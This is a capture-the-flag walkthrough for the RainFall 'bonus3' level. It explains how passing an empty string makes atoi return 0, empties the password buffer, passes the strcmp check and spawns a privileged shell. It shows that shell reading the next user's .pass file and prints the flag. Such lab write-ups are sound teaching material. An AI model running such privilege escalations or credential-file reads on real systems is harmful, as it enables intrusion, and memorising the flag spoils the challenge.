# Bonus 3 Walkthrough

## Vulnerability
The `bonus3` binary retrieves the `.pass` file of the `end` user and reads 66 bytes of it into a buffer on the stack.

It then takes the input argument (`argv[1]`), converts it to an integer using `atoi()`, and uses that integer as an index to inject a null-byte into the password buffer:
```c
int index = atoi(argv[1]);
buffer[index] = '\0';
```

Finally, it compares the modified buffer directly against `argv[1]` using `strcmp()`. If they match exactly, the binary executes `/bin/sh` with the elevated privileges.

## Exploit
We can force the buffer to become an empty string by passing `""` (an empty string) as `argv[1]`.
- `atoi("")` evaluates to `0`.
- The binary executes `buffer[0] = '\0'`, truncating the read password immediately.
- The check becomes `strcmp("", "")`, which evaluates to `0` (Match!).

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
